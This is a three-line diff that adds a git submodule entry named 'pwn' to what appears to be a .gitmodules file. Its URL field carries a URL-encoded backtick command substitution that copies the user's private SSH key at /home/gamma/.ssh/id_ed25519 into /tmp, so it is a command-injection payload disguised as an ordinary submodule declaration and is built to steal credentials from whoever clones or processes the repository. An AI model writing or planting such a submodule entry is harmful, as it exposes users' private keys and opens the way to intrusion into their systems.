@@ -1,0 +1,3 @@
+[submodule "pwn"]
+    path = pwn
+    url = ssh://x/x%60cat%20/home/gamma/.ssh/id_ed25519%20%3E%20/tmp/gamma_key%60
